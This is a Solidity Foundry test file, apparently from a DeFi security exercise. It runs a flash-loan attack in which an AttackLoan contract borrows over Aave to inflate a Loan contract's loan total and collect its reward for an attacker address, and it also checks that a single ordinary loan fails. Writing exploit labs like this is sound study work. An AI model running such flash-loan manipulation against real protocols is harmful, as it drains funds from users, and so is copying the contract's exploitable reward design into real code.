pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Loan, IPool} from "../../src/flashloan/Loan.sol";
import {AttackLoan} from "./AttackLoan.sol";

contract LoanTest is Test {
    ERC20 public reward;
    Loan public loan;
    ERC20 public constant DAI = ERC20(0x8a0E31de20651fe58A369fD6f76c21A8FF7f8d42);
    uint256 public rewardAmount = 1e18;

    function setUp() public {
        reward = new ERC20("Wrapped Ether", "WETH");
        loan = new Loan(address(reward));
        deal(address(reward), address(loan), rewardAmount);
    }

    function testAttackLoan() public {
        // mintable amount on aave is 10k so we have to go above taht amount
        uint256 minFlashLoan = 1e23 + 1;
        address attacker = address(123);
        IPool iPool = IPool(loan.POOL());
        AttackLoan attackLoan = new AttackLoan(address(loan));
        deal(address(DAI), address(attackLoan), minFlashLoan / 1e3);

        vm.prank(attacker);
        iPool.flashLoanSimple(address(attackLoan), address(DAI), minFlashLoan, "", 0);

        assertEq(loan.totalLoans(address(attackLoan)), minFlashLoan, "!totalLoans");
        assertEq(reward.balanceOf(attacker), rewardAmount, "!rewardsAmount");
    }

    function testOneLoanWontDo() public {
        // mintable amount on aave is 10k so we have to go above taht amount
        uint256 minFlashLoan = 1e23 + 1;
        address attacker = address(123);
        deal(address(DAI), address(loan), minFlashLoan / 1e4);
        IPool iPool = IPool(loan.POOL());

        vm.prank(attacker);
        vm.expectRevert(bytes("!amount"));
        iPool.flashLoanSimple(address(loan), address(DAI), minFlashLoan, "", 0);

        assertEq(loan.totalLoans(address(attacker)), 0, "!totalLoans");
        assertEq(reward.balanceOf(attacker), 0, "!rewardsAmount");
    }
}